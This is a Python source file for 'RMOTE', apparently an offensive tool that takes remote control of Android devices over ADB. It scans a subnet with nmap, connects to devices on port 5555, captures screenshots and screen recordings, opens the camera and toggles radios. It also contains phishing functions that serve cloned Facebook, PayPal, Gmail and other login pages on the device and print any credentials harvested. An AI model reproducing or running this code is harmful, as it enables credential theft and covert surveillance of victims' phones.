# Creator: GenrevReyes

# Github: https://github.com/Genrev-Reyes

# This tool is for educational purpose only..!

# Requirements: python3/python wireless-tools adb/android-tools

# clone for this repository..

# git clone https//github.com/Genrev-Reyes/RMOTE

# Enter the directory..
    # cd RMOTE


# Run the tool..

    # python3 Rmote.py


# Supported > termux / linux :)





from time import sleep
import sys
import os
import socket
#__________#
from os import system
from os import chdir
from os.path import isfile

#Scan Users Connected on wifi network

def scan_ip():

    user_ip = input("Enter your ip address: ")
    scan = os.system(f"nmap -sP {user_ip}/24")

inet="ifconfig"
sleep(1)
os.system("clear")
#Colors
purple="\033[0;35m"
red = "\033[;031m"
green="\033[0;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
cyan="\033[0;36m"     
white="\033[0;37m"
# Rmote Banner!!
# PLEASE DONT CHANGE MY BANNER :(
banner=f"""

{red}██████╗░███╗░░░███╗░█████╗░████████╗███████╗
{cyan}██╔══██╗████╗░████║██╔══██╗╚══██╔══╝██╔════╝
{yellow}██████╔╝██╔████╔██║██║░░██║░░░██║░░░█████╗░░
{blue}██╔══██╗██║╚██╔╝██║██║░░██║░░░██║░░░██╔══╝░░
{red}██║░░██║██║░╚═╝░██║╚█████╔╝░░░██║░░░███████╗
{yellow}╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚════╝░░░░╚═╝░░░╚══════╝
{green}                             [GenrevReyes]:)


"""

print(banner)
print(f"{green}[+] Type 'help' ")
sleep(1)
print(" ")
sleep(1)

#HELP
help=f"""
{cyan}
_______________ 
|[+] connect  |
|             |
|[+] ifconfig |
|             |
|[+] run      |
|             |
|[+] scan     |
|             |
|[+] clear    |
|             |
|[+] quit     |
|_____________|

"""

# PLEASE DONT DONT CHANGE THE OPTIONS :(
options=f"""
{yellow}

              [+] Select An Options
{cyan}
__________________________________________________
|[+] right                 [+] set battery_status|
|                                                |
|[+] left                  [+] battery_status    |
|                                                |
|[+] up                    [+] screenshot        |
|                                                |
|[+] down                  [+] screen_record     |
|                                                |
|[+] text                  [+] screen_size       |
|                                                |
|[+] disconnect            [+] open_camera       |
|                                                |
|[+] right                 [+] power_off         |
|                                                |
|[+] reboot                [+] device_info       |
|                                                |
|[+] home                  [+] open_url          |
|                                                |
|[+] space                 [+] volume_up         |
|                                                |
|[+] click                 [+] volume_down       |
|                                                |
|[+] clear                 [+] devices           |
|    						 |
|[+] phish                 [+] port_forwarding   |
|						 |
|[+] set wifi              [+] set bluetooth     |
|						 |
|[+] set airplane_mode     [+] set mobile_data   |
|________________________________________________|

"""

phish_choices=f"""
{yellow}
 
    [+] Select An Options
{cyan}
_______________________________
|                  	      |
|[+] Facebook     [+] Roblox  |
|       		      |
|[+] Instagram    [+] Paypal  |
|                             |
|[+] Spotify      [+] Twitch  |
|                             |
|[+] Twitter      [+] Netflix |
|          		      |
|[+] Snapchat     [+] Gmail   |
|			      |
|[+] Yahoo        [+] Tiktok  |
|_____________________________|
"""

HELP = f"""
{cyan}
_____________________
|		    |
|[+] options        |
|		    |
|[+] clear_screen   |
|                   |
|[+] exit           |
|___________________|
"""


def facebook():
     File = chdir(".web")
     Website = chdir("facebook")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()

def instagram():
     File = chdir(".web")
     Website = chdir("instagram")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()



def spotify():
     File = chdir(".web")
     Website = chdir("spotify")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"                               
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()

def netflix():
     File = chdir(".web")
     Website = chdir("netflix")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()


def tiktok():
     File = chdir(".web")
     Website = chdir("tiktok")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()



def gmail():
     File = chdir(".web")
     Website = chdir("google")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()

def twitter():
     File = chdir(".web")
     Website = chdir("twitter")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()


def paypal():
     File = chdir(".web")
     Website = chdir("paypal")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()

def yahoo():
     File = chdir(".web")
     Website = chdir("yahoo")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()






def roblox():
     File = chdir(".web")
     Website = chdir("roblox")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()


def snapchat():
     File = chdir(".web")
     Website = chdir("snapchat")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()

def twitch():
     File = chdir(".web")
     Website = chdir("twitch")
     New_file = open("usernames.txt", "w")
     New_file.write(" ")
     forward_host = system("adb forward tcp:8080 tcp:8080")
     system("adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8080")
     Start = system("php -S 127.0.0.1:8080 && clear")
     try:
         while Start:
            print(" ")
            if os.stat("usernames.txt").st_size == 0:
                print(f'{yellow}[+] No Have Login Info yet')
                sleep(1)
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
            else:
                sleep(2)
                print(" ")
                print(f'{yellow}[+] Account Founded !')
                sleep(2)
                print(" ")
                system("cat usernames.txt")
                print(" ")
                Termux = "/data/data/com.termux/files/home/RMOTE/.web/facebook/login.php"
                Linux = "/root/RMOTE/.web/facebook/login.php"
                if isfile(Termux):
                    chdir("/data/data/com.termux/files/home/RMOTE")
                    break
                if isfile(Linux):
                    chdir("/root/RMOTE")
                    break
     except KeyboardInterrupt:
         print(f'{red}[+] Thanks For using')
         sleep(1)
         sys.exit()


while True:
    shell = input(f"{yellow}RMOTE >{white} ")
    print(" ")
    if shell == "connect":
        ip = input("Enter ip adress > ")
        os.system(f"adb connect {ip}:5555")
        sleep(5)
    if shell == "run":
        sleep(2)
        break
    if shell == "clear":
        os.system("clear")
    if shell == "quit":
        sys.exit()
    if shell == "help":
        print(help)
    if shell == "ifconfig":
       os. system(f"{inet}")
    if shell == "scan":
        scan_ip()

os.system("clear")
print(banner)
sleep(0.7)
print(f'{yellow}[+] [Type] > options')
print(" ")
while True:
    user = input(f"{red}RMOTE >{white} ")
    print(" ")
    if user == "help":
        print(HELP)
    if user == "left":
        os.system("adb shell input keyevent 21")
    if user == "right":
        os.system("adb shell input keyevent 22")
    if user == "down":
        os.system("adb shell input keyevent 20")
    if user == "volume_up":
        os.system("adb shell input keyevent 24")
    if user == "volume_down":
        os.system("adb shell input keyevent 25")
    if user == "up":
        os.system("adb shell input keyevent 19")
    if user == "space":
        os.system("adb shell input keyevent 62")
    if user == "text":
        print(" ")
        console = input(f"{yellow}WriteText: ")
        os.system(f"adb shell input text {console}")
    if user == "click":
        os.system("adb shell input keyevent 66")

    if user == "clear":
        os.system("adb shell input keyevent 28")

    if user == "power_off":
        os.system("adb shell input keyevent 26")

    if user == "home":
        os.system('adb shell input keyevent 3')
    if user == "screen_size": 
        print(f"{yellow}[+] Default size: 1280x720")
        print(" ")
        con = input(f"{yellow}[+] Screensize: ")
        os.system(f"adb shell wm size {con}")
    if user == "reboot":
        os.system("adb reboot recovery")
    if user == "screen_record":
        os.system("adb shell screenrecord /mnt/sdcard/Download/test.mp4")
        sleep(1)
        os.system("adb pull /mnt/sdcard/Download/test.mp4 test.mp4") 
    if user == "screenshot":
        os.system("adb shell screencap /mnt/sdcard/Download/test.png")
        sleep(1)
        os.system("adb pull /mnt/sdcard/Download/test.png test.png")
    if user == "disconnect":
        os.system("adb disconnect")
    if user == "clear_screen":
        os.system('clear')
        print(banner)
    if user == "options":
        print(options)
    if user == "exit":
        sys.exit()
    if user == "open_url":     
        link = input(f"{yellow}[+] Enter url:")
        os.system(f"adb shell am start -a android.intent.action.VIEW -d {link}")
    if user == "devices":
        os.system("adb devices")
    if user == "battery_status":
        os.system("adb shell dumpsys battery")
    if user == "set battery_status":
        level = input(f"{yellow}set level battery > ")
        os.system(f"adb shell dumpsys battery set level {level}")
    if user == "device_info":
        os.system("adb shell dumpsys")
    if user == "open_camera":
        os.system("adb shell am start -a android.media.action.VIDEO_CAPTURE")
    if user == "port_forwarding":
        port_devices = input(f"{yellow}[+] Enter a port on the devices: ")
        sleep(2)
        print(" ")
        forward_port = input(f"{yellow}[+] Enter a port to forward it too: ")
        Forward = system(f"adb forward tcp:{port_devices} tcp:{forward_port}")
    if user == "phish":
        print(phish_choices)
        choice = input(f"{yellow}[+] Enter Sites: ")
        if choice == "Facebook":
            facebook()
        if choice == "Instagram":
            instagram()
        if choice == "Spotify":
            spotify()
        if choice == "Netflix":
            netflix()
        if choice == "Tiktok":
            tiktok()
        if choice == "Paypal":
            paypal()
        if choice == "Gmail":
            gmail()
        if choice == "Yahoo":
            yahoo()
        if choice == "Roblox":
            roblox()
        if choice == "Twitter":
            twitter()
        if choice == "Twitch":
            twitch() 
        if choice == "Snapchat":
            snapchat()

    if user == "set wifi":
        toggle = input(f'{yellow}[+] Enter on/off: ')
        if toggle == "on":
            system("adb shell svc wifi enable")
        if toggle == "off":
            system("adb shell svc wifi disable")
        if not toggle in ("on", "off"):
            sleep(1)
            print(f'{red}[!] Wrong input')
            print(" ")
    if user == "set bluetooth":
        toggle = input(f"{yellow}[+] Enter on/off: ")
        if toggle == 'on':
            system("adb shell settings put global bluetooth_disabled_profiles 1")
        if toggle == 'off':
            system("adb shell settings put global bluetooth_disabled_profiles 0")
        if not toggle in ("on", "off"):
            sleep(1)
            print(f'{red}[!] Wrong input')
            print(" ")
    if user == "set mobile_data":
        toggle = input(f"{yellow}[+] Enter on/off: ")
        if toggle == "on":
            system("adb shell svc data enable")
        if toggle == "off":
            system("adb shell svc data disable")
        if not toggle in("on", "off"):
            sleep(1)
            print(f'{red}[!] Wrong input')
            print(" ")
    if user == "set airplane_mode":
        toggle = input(f"{yellow}[+] Enter: on/off: ")
        if toggle == 'on':
            system("adb shell settings put global airplane_mode_on 1")
        if toggle == "off":
            system("adb shell am broadcast -a android.intent.action.AIRPLANE_MODE")
        if not toggle in ("on", "off"):
            sleep(1)
            print(f'{red}[!] Wrong input')
            print(" ")
    
